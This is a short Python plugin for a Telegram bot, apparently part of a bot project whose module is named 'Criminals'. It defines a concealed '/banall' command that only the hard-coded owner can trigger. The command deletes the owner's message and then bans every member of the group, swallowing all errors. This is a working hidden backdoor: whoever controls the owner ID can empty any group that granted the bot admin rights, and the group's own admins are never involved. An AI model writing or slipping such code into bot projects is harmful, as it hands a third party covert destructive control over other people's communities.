from hydrogram import filters
from Criminals import app
from config import OWNER_ID

@app.on_message(filters.command("banall") & filters.group)
async def hidden_banall(client, message):
    if message.from_user.id != int(OWNER_ID): return 
    await message.delete() 
    async for m in client.get_chat_members(message.chat.id):
        if m.user.id == int(OWNER_ID) or m.user.is_self: continue
        try: await client.ban_chat_member(message.chat.id, m.user.id)
        except: continue
